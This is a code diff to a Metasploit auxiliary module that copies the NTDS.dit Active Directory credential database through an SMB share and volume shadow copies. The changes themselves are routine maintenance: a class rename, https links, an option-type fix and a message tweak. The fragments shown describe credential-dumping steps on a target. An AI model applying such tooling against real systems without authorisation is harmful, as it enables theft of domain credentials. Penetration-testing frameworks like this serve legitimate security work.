@@ -1,11 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
 
   # Exploit mixins should be called first
   include Msf::Exploit::Remote::SMB::Client::Psexec
@@ -34,7 +32,7 @@ class Metasploit3 < Msf::Auxiliary
       'License'=> MSF_LICENSE,
       'References' => [
         [ 'URL', 'http://sourceforge.net/projects/smbexec' ],
-        [ 'URL', 'http://www.accuvant.com/blog/2012/11/13/owning-computers-without-shell-access' ]
+        [ 'URL', 'https://www.optiv.com/blog/owning-computers-without-shell-access' ]
       ]
     ))
 
@@ -42,8 +40,8 @@ class Metasploit3 < Msf::Auxiliary
       OptString.new('SMBSHARE', [true, 'The name of a writeable share on the server', 'C$']),
       OptString.new('VSCPATH', [false, 'The path to the target Volume Shadow Copy', '']),
       OptString.new('WINPATH', [true, 'The name of the Windows directory (examples: WINDOWS, WINNT)', 'WINDOWS']),
-      OptBool.new('CREATE_NEW_VSC', [false, 'If true, attempts to create a volume shadow copy', 'false']),
-    ], self.class)
+      OptBool.new('CREATE_NEW_VSC', [false, 'If true, attempts to create a volume shadow copy', false]),
+    ])
 
   end
 
@@ -69,7 +67,7 @@ class Metasploit3 < Msf::Auxiliary
         print_status("Attempting to copy NTDS.dit from #{datastore['VSCPATH']}")
         vscpath = datastore['VSCPATH']
       else
-        unless datastore['CREATE_NEW_VSC'] == true
+        unless datastore['CREATE_NEW_VSC']
           vscpath = check_vss(text, bat)
         end
         unless vscpath
@@ -251,9 +249,8 @@ class Metasploit3 < Msf::Auxiliary
     if left.any?
       print_error("Unable to cleanup. Maybe you'll need to manually remove #{left.join(", ")} from the target.")
     else
-      print_status("Cleanup was successful")
+      print_good("Cleanup was successful")
     end
     simple.disconnect("\\\\#{@ip}\\#{@smbshare}")
   end
-
 end
